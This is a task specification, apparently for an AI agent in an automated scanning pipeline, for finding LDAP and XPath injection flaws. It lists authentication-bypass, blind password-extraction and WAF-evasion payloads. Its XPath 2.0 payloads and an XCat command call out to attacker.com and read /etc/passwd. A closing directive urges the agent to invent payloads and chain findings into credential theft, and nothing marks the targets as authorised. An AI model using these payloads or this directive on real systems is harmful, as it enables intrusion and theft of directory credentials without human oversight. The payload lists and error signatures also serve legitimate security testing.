================================================================================
TASK 49 â€” LDAP & XPATH INJECTION SCANNER
================================================================================
Covers testing_toolkit.txt Step 14 (LDAP/XPath portions)
NoSQL already handled by Task 45

OBJECTIVE
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Identify LDAP injection and XPath injection vulnerabilities in:
- Enterprise login/search forms (LDAP)
- XML-based applications, SOAP APIs (XPath)
- Directory service integrations
- SAML/SSO implementations

================================================================================
                              INPUT FILES
================================================================================
PRIMARY (high-priority targets):
  outputs/queue_dynamic_endpoints_urls.txt    â† params to inject
  outputs/arjun_found_params.txt              â† discovered hidden params
  outputs/api_endpoints_live.txt              â† authenticated API routes

SECONDARY (broaden coverage):
  outputs/har/common_data.txt                 â† HAR-extracted endpoints
  outputs/live_base_urls.txt                  â† base URLs for discovery

INTELLIGENCE (adaptive testing):
  outputs/waf_summary.json                    â† WAF bypass selection
  outputs/nuclei/tech_stack.json              â† tech stack detection

================================================================================
                             OUTPUT FILES
================================================================================
outputs/ldap_xpath/
â”œâ”€â”€ ldap_injection_findings.json      â† confirmed LDAP injection vulns
â”œâ”€â”€ xpath_injection_findings.json     â† confirmed XPath injection vulns
â”œâ”€â”€ ldap_candidates.txt               â† likely LDAP endpoints (for manual)
â”œâ”€â”€ xpath_candidates.txt              â† likely XPath endpoints (for manual)
â”œâ”€â”€ scan_log.txt                      â† full execution log
â””â”€â”€ checkpoint.json                   â† resume state

================================================================================
                         LDAP INJECTION OVERVIEW
================================================================================
LDAP (Lightweight Directory Access Protocol) injection occurs when user input
is inserted into LDAP queries without proper sanitization.

COMMON LDAP TARGETS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- Login forms (username field)
- User search/lookup functionality
- Employee directories
- Active Directory integrations
- LDAP-based authentication
- Certificate lookup services

LDAP-LIKELY PARAMETER NAMES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
username, user, uid, cn, sn, mail, email, dn, ou, dc, samaccountname,
userprincipalname, memberof, objectclass, filter, search, query, ldap,
directory, ad, account, login, name, firstname, lastname, department,
manager, employee, staff, person

================================================================================
                         LDAP INJECTION PAYLOADS
================================================================================

SECTION 1: AUTHENTICATION BYPASS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Basic wildcard bypass
*
*)(uid=*)
*)(uid=*))
*))%00

# NULL injection (terminate query)
admin)(|(password=*
admin)(&)
admin)(objectClass=*
user))(|(objectClass=*

# Always-true conditions
*)(objectClass=*
*)(cn=*
*)|(&)
*))(|(uid=*

SECTION 2: INFORMATION DISCLOSURE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Extract user attributes
*)(|(mail=*
*)(|(cn=*
*)(|(sn=*
*)(|(telephoneNumber=*
*)(|(description=*

# Enumerate users
a*)(|(uid=*
b*)(|(uid=*
admin*)(|(uid=*

# Extract group membership
*)(|(memberOf=*
*)(|(member=*

SECTION 3: BLIND LDAP INJECTION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Character-by-character extraction
admin*)(uid=a*
admin*)(uid=b*
admin*)(password=a*
admin*)(password=b*

# Boolean-based detection
*)(uid=admin)(|(uid=*          â† true if admin exists
*)(uid=nonexistent)(|(uid=*    â† false (baseline)

# Time-based (if supported)
*)(uid=admin)(objectClass=top)(objectClass=person)(|(uid=*

SECTION 4: FILTER MANIPULATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Inject additional filters
)(cn=*
)(uid=*
)(objectClass=*
))(|(objectClass=*

# Escape sequence attacks
\00                            â† NULL byte
\2a                            â† asterisk (*)
\28                            â† open paren
\29                            â† close paren
\5c                            â† backslash

SECTION 5: LDAP OPERATOR ABUSE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# AND operator injection
)(&)(uid=*
)(!(uid=nonexistent)

# OR operator injection
)(|(uid=*
)(|(cn=*

# NOT operator injection
)(!(objectClass=nonexistent)
)(!(uid=)

================================================================================
                         XPATH INJECTION OVERVIEW
================================================================================
XPath injection occurs when user input is inserted into XPath queries used
to navigate XML documents.

COMMON XPATH TARGETS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- XML data stores
- SOAP web services
- REST APIs returning/processing XML
- SAML authentication
- Configuration file parsing
- Document management systems
- Search functionality over XML data

XPATH-LIKELY PARAMETER NAMES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
xpath, xml, path, node, element, query, search, id, name, user, username,
login, password, filter, select, where, value, attribute, tag, document

================================================================================
                         XPATH INJECTION PAYLOADS
================================================================================

SECTION 6: AUTHENTICATION BYPASS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Classic OR injection
' or '1'='1
' or ''='
" or "1"="1
" or ""="
' or 1=1 or ''='
" or 1=1 or ""="

# Closing bracket injection
'] | //* | /foo[bar='
') or ('1'='1
") or ("1"="1

# Comment injection (if supported)
' or '1'='1' --
' or '1'='1' #

SECTION 7: INFORMATION EXTRACTION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Extract all nodes
' or 1=1]/parent::*/child::*[''='
' | //* | '
' | //user/* | '
' | //password | '

# Navigate to root
' or name()='
' | /* | '
' | //* | '

# Extract node names
' or name()='user
' or name()='password
' or name()='admin

SECTION 8: BLIND XPATH INJECTION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Boolean-based extraction
' or substring(//user/password,1,1)='a
' or substring(//user/password,1,1)='b
' or string-length(//user/password)>5
' or string-length(//user/password)>10

# Character-by-character
' or substring(name(/*),1,1)='a' and ''='
' or substring(name(/*[1]),1,1)='a' and ''='

# Count-based
' or count(//user)>0 and ''='
' or count(//user)=1 and ''='

SECTION 9: XPATH 2.0 SPECIFIC
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If XPath 2.0 is supported
' or doc('http://attacker.com/xxe.xml') and ''='
' or unparsed-text('file:///etc/passwd') and ''='

# String functions
' or matches(//password,'.*') and ''='
' or contains(//password,'admin') and ''='

SECTION 10: OPERATOR ABUSE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Logical operators
' and '1'='1
' and ''='
" and "1"="1
' or not('1'='2') and ''='

# Comparison operators
' or 1<2 and ''='
' or 1>0 and ''='
' or 1!=0 and ''='

================================================================================
                           WAF BYPASS TECHNIQUES
================================================================================

SECTION 11: ENCODING BYPASSES
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# URL encoding
%27%20or%20%271%27%3D%271          â† ' or '1'='1
%2a%29%28%7c%28uid%3d%2a           â† *)(|(uid=*

# Double URL encoding
%252a%2529%2528                    â† *)(

# Unicode encoding
\u0027 or \u00271\u0027=\u00271    â† ' or '1'='1
\x27 or \x271\x27=\x271            â† hex variant

# HTML entities
&#39; or &#39;1&#39;=&#39;1        â† ' or '1'='1
&#x27; or &#x27;1&#x27;=&#x27;1   â† hex HTML

SECTION 12: CASE & WHITESPACE
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Case variations
' OR '1'='1
' oR '1'='1
' Or '1'='1

# Alternative whitespace
'%09or%09'1'='1                    â† tab
'%0aor%0a'1'='1                    â† newline
'%0cor%0c'1'='1                    â† form feed
'/**/or/**/'1'='1                  â† SQL-style comments

SECTION 13: STRING CONCATENATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# XPath concat
' or concat('1','')='1' and ''='
' or string('1')='1' and ''='

# Split injection
'+'or+'1'='1
'||'or'||'1'='1

================================================================================
                              TOOL COMMANDS
================================================================================

LDAP INJECTION TESTING (Custom Scripts Required):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
No mature CLI tool exists for LDAP injection. Use custom Python with:

# Basic injection test
curl -s "https://target.com/login" \
  -d "username=*)(uid=*)&password=test" \
  --proxy http://127.0.0.1:8080

# With authentication
curl -s "https://target.com/search" \
  -H "Cookie: session=xxx" \
  -d "query=*)(cn=*" \
  --proxy http://127.0.0.1:8080

XPATH INJECTION TESTING:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# XCat - XPath injection tool
xcat detect --url="https://target.com/search?query=INJECT"
xcat run --url="https://target.com/search?query=INJECT" \
         --method=GET \
         --true-string="found" \
         --oob-http="http://attacker.com/"

# XPath error-based
curl -s "https://target.com/api" \
  -H "Content-Type: application/xml" \
  -d '<search><query>'\'' or '\''1'\''='\''1</query></search>'

================================================================================
                        DETECTION SIGNATURES
================================================================================

LDAP ERROR SIGNATURES (indicates injectable):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- "Invalid DN syntax"
- "ldap_search"
- "Bad search filter"
- "Error in filter"
- "Invalid filter"
- "javax.naming.NamingException"
- "com.sun.jndi.ldap"
- "LDAPException"
- "LDAP error"
- "Search filter is invalid"
- "error:0x"
- "error 0x"

XPATH ERROR SIGNATURES (indicates injectable):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- "XPathException"
- "Invalid XPath"
- "XPath syntax error"
- "javax.xml.xpath"
- "XPathEvalError"
- "SimpleXMLElement::xpath"
- "DOMXPath"
- "XPATH syntax error"
- "Invalid expression"
- "xmlXPathEval"
- "xpath.evaluate"
- "XPath error"

BEHAVIOR-BASED DETECTION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
- Different response length with ' vs normal input
- Different response time (blind injection)
- Different HTTP status code
- Additional data returned (OR injection success)
- Error message differences

================================================================================
                     TARGET IDENTIFICATION HEURISTICS
================================================================================

HIGH-PRIORITY LDAP TARGETS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Login forms with "username" field (not email-based)
2. Employee/staff directory search
3. "Forgot password" with username lookup
4. Certificate/key lookup services
5. Any endpoint with "ldap", "directory", "ad" in path/params
6. Enterprise applications (especially Java/.NET)
7. SSO/SAML implementations
8. Corporate intranets

HIGH-PRIORITY XPATH TARGETS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. SOAP web services
2. Endpoints accepting XML input
3. Search functionality over structured data
4. Document/content management systems
5. Endpoints with "xml", "xpath", "node" in params
6. SAML authentication flows
7. REST APIs with XML content-type
8. Configuration/settings endpoints

================================================================================
                         EXECUTION WORKFLOW
================================================================================

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Load & Classify Targets                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Load queue_dynamic_endpoints_urls.txt                                     â”‚
â”‚ â€¢ Load api_endpoints_live.txt                                               â”‚
â”‚ â€¢ Identify LDAP-likely endpoints (login, search, directory)                 â”‚
â”‚ â€¢ Identify XPath-likely endpoints (XML, SOAP, xpath params)                 â”‚
â”‚ â€¢ Check tech_stack.json for tech hints (Java/.NET = LDAP likely)            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 2: LDAP Injection Testing                                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR each LDAP candidate:                                                    â”‚
â”‚   a) Send baseline request (normal input)                                   â”‚
â”‚   b) Send wildcard probe: *                                                 â”‚
â”‚   c) Send bypass probe: *)(uid=*)                                           â”‚
â”‚   d) Check for LDAP error signatures                                        â”‚
â”‚   e) Compare response length/content                                        â”‚
â”‚   f) If injectable â†’ log + attempt blind extraction                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 3: XPath Injection Testing                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR each XPath candidate:                                                   â”‚
â”‚   a) Send baseline request (normal input)                                   â”‚
â”‚   b) Send quote probe: '                                                    â”‚
â”‚   c) Send OR bypass: ' or '1'='1                                            â”‚
â”‚   d) Check for XPath error signatures                                       â”‚
â”‚   e) Compare response length/content                                        â”‚
â”‚   f) If injectable â†’ run XCat for extraction                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 4: Blind Injection Testing                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR endpoints with response differences but no errors:                      â”‚
â”‚   a) Boolean-based: true/false condition comparison                         â”‚
â”‚   b) Time-based: measure response delays                                    â”‚
â”‚   c) Character extraction: substring-based blind                            â”‚
â”‚   d) Use OOB if available (XPath 2.0 doc() function)                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 5: Output & Report                                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Write ldap_injection_findings.json                                        â”‚
â”‚ â€¢ Write xpath_injection_findings.json                                       â”‚
â”‚ â€¢ Write candidates lists for manual testing                                 â”‚
â”‚ â€¢ Generate severity ratings                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
                     AI AGENT CREATIVITY DIRECTIVE
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                          ğŸ§  USE YOUR BRAIN ğŸ§                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ The payloads above are STARTING POINTS, not an exhaustive list.             â”‚
â”‚                                                                             â”‚
â”‚ You are an intelligent agent. When testing:                                 â”‚
â”‚                                                                             â”‚
â”‚ 1. OBSERVE response patterns and adapt payloads accordingly                 â”‚
â”‚ 2. COMBINE techniques (encoding + injection + operators)                    â”‚
â”‚ 3. INVENT new payloads based on target behavior                             â”‚
â”‚ 4. CHAIN vulnerabilities (LDAP injection â†’ credential theft)                â”‚
â”‚ 5. THINK about application context (what would LDAP query look like?)       â”‚
â”‚                                                                             â”‚
â”‚ If you discover the application uses a specific LDAP implementation         â”‚
â”‚ (OpenLDAP, Active Directory, etc.), research its specific quirks.           â”‚
â”‚                                                                             â”‚
â”‚ Trust your analysis. Create custom payloads. Be creative.                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

DYNAMIC PAYLOAD GENERATION (AI BRAIN FEATURES):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
The Python brain (ldap_xpath_scanner.py) includes DynamicPayloadGenerator with:

1. CONTEXT-AWARE GENERATION
   - Analyzes parameter name â†’ generates relevant payloads
   - username/login params â†’ auth bypass focus
   - search/query params â†’ data extraction focus
   - Adapts to detected WAF type

2. ADAPTIVE LEARNING
   - Tracks successful payloads â†’ prioritizes similar patterns
   - Tracks blocked payloads â†’ avoids wasting requests
   - Learns error patterns â†’ generates error-based variants

3. BLIND EXTRACTION ENGINE
   - Binary search for string length detection
   - Character-by-character extraction
   - Optimized charset (by frequency) for speed
   - XPath substring() and string-length() techniques

4. WAF BYPASS GENERATOR
   - URL encoding chains (single, double)
   - Case variations (OR, Or, oR)
   - Whitespace mutations (tab, newline, double space)
   - Unicode escapes for LDAP special chars
   - Comment injection for XPath 2.0

THINK LIKE THE DEVELOPER:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
LDAP Query Construction (what you're breaking):
  (&(uid={USER_INPUT})(password={PASS_INPUT}))
  
If you inject: *)(uid=*)
Query becomes: (&(uid=*)(uid=*))(password=test))
               â†‘ this matches everything

XPath Query Construction (what you're breaking):
  //users/user[username='{USER_INPUT}' and password='{PASS_INPUT}']
  
If you inject: ' or '1'='1
Query becomes: //users/user[username='' or '1'='1' and password='xxx']
               â†‘ this is always true

CREATIVE TECHNIQUES TO TRY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. LDAP: If wildcard (*) is blocked, try character ranges: [a-z]*
2. LDAP: Try objectClass enumeration to find interesting object types
3. LDAP: Use !(negation) to find records NOT matching criteria
4. XPath: Try ancestor/descendant axes: ancestor::*, descendant::*
5. XPath: Use position() and last() for enumeration: [position()=1]
6. XPath: Try XPath 2.0 functions if 1.0 payloads fail: matches(), tokenize()
7. Both: If direct injection fails, try HTTP Parameter Pollution
8. Both: Try null byte termination: payload%00
9. Both: Try CRLF injection to break out of context: payload%0d%0a

================================================================================
                              CHECKPOINT/RESUME
================================================================================
checkpoint.json format:
{
  "last_target_index": 150,
  "ldap_completed": ["url1", "url2"],
  "xpath_completed": ["url3", "url4"],
  "findings_count": {"ldap": 2, "xpath": 1},
  "timestamp": "2026-01-13T10:30:00Z"
}

Resume: Load checkpoint, skip completed targets, continue from last_target_index

================================================================================
                             9-MINUTE BATCHING
================================================================================
- Process 50 LDAP candidates per batch
- Process 50 XPath candidates per batch
- Write outputs after each batch
- Checkpoint every batch
- Total timeout: 8 minutes active scanning + 1 minute output writing

================================================================================
                                  NOTES
================================================================================
- LDAP injection is RARE but HIGH IMPACT (often = full directory access)
- XPath injection is RARE but can leak entire XML document contents
- Both require specific application architecture (not all apps use LDAP/XML)
- Error-based detection is most reliable for initial discovery
- Blind injection requires patience and methodical character extraction
- Consider chaining: LDAP creds â†’ other system access
================================================================================
